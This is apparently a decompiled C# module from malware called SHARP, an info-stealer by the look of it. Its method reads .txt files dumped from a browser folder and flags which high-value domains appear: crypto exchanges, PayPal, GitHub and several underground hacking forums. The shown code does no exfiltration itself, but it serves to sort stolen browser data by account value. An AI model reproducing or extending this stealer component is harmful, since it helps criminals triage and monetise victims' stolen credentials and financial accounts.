﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace SHARP
{
	// Token: 0x0200001B RID: 27
	internal class URLSearcher
	{
		// Token: 0x060000A6 RID: 166 RVA: 0x00004A2C File Offset: 0x00002C2C
		public static string GetDomainDetect(string Browser)
		{
			string result;
			try
			{
				string[] array = new string[]
				{
					"cryptonator.com",
					"payeer.com",
					"lolz.guru",
					"wwh-club.net",
					"xss.is",
					"bhf.io",
					"btc.com",
					"minergate.com",
					"blockchain.com",
					"github.com",
					"coinbase.com",
					"paypal.com",
					"zelenka.guru",
					"lolz.live",
					"binance.com"
				};
				FileInfo[] files = new DirectoryInfo(Browser).GetFiles("*.txt", SearchOption.TopDirectoryOnly);
				List<string> list = new List<string>();
				foreach (FileInfo fileInfo in files)
				{
					list.AddRange(File.ReadAllLines(fileInfo.FullName, Encoding.UTF8));
				}
				HashSet<string> hashSet = new HashSet<string>();
				foreach (string text in list)
				{
					foreach (string item in (from w in text.Split(Array.Empty<char>())
					select w.Trim() into w
					where w != ""
					select w.ToLower()).ToList<string>())
					{
						if (!hashSet.Contains(item))
						{
							hashSet.Add(item);
						}
					}
				}
				HashSet<string> hashSet2 = new HashSet<string>();
				foreach (string text2 in array)
				{
					using (HashSet<string>.Enumerator enumerator3 = hashSet.GetEnumerator())
					{
						while (enumerator3.MoveNext())
						{
							if (enumerator3.Current.Contains(text2) && !hashSet2.Contains(text2))
							{
								hashSet2.Add(text2);
							}
						}
					}
				}
				result = string.Join("\n - ", hashSet2);
			}
			catch (Exception)
			{
				result = "";
			}
			return result;
		}
	}
}
